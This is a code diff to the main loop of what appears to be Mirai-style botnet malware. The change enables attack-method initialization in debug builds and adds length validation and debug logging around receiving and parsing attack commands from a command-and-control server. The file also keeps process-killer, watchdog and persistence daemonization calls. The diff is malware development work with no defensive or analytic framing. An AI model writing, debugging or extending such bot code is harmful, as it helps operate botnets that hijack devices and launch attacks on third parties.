@@ -266,17 +266,11 @@ int main(int argc, char **args)
     write(STDOUT, "\n", 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
 
-    // Skip attack initialization in DEBUG mode to force CNC connection
-    #ifndef DEBUG
+    // Initialize attack methods (required for CNC commands)
     attack_init();
     killer_init();
     watchdog_maintain();
     // scanner_init(); // disabled per request
-    #else
-    // In DEBUG mode, still initialize basic functions but skip test attacks
-    killer_init();
-    watchdog_maintain();
-    #endif
 
 #ifndef DEBUG
     // Enhanced daemonization for persistence
@@ -509,18 +503,54 @@ int main(int argc, char **args)
 
             recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
             len = ntohs(len);
-            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
-
+            
             time_t now = time(NULL);
             char timestamp[64];
             strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
             
             #ifdef DEBUG
+                printf("[%s] [CONN] received length field: %d bytes\n", timestamp, len);
+            #endif
+            
+            if (len <= 0 || len > 4096) {
+                #ifdef DEBUG
+                    printf("[%s] [CONN] Invalid length: %d, skipping\n", timestamp, len);
+                #endif
+                continue;
+            }
+            
+            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
+            
+            #ifdef DEBUG
                 printf("[%s] [CONN] received %d bytes from CNC\n", timestamp, len);
+                printf("[%s] [CONN] Buffer content (first 16 bytes): ", timestamp);
+                int i;
+                for (i = 0; i < 16 && i < len; i++) {
+                    printf("%02x ", (unsigned char)rdbuf[i]);
+                }
+                printf("\n");
             #endif
 
-            if(len > 0)
+            if(len > 0) {
+                #ifdef DEBUG
+                    printf("[MAIN] Calling attack_parse with %d bytes\n", len);
+                    fflush(stdout);
+                #endif
+                
+                // Add a simple test to see if attack_parse is being called
+                printf("[MAIN] About to call attack_parse...\n");
+                fflush(stdout);
+                
                 attack_parse(rdbuf, len);
+                
+                #ifdef DEBUG
+                    printf("[MAIN] attack_parse returned\n");
+                    fflush(stdout);
+                #endif
+                
+                printf("[MAIN] attack_parse completed\n");
+                fflush(stdout);
+            }
         }
     }
 
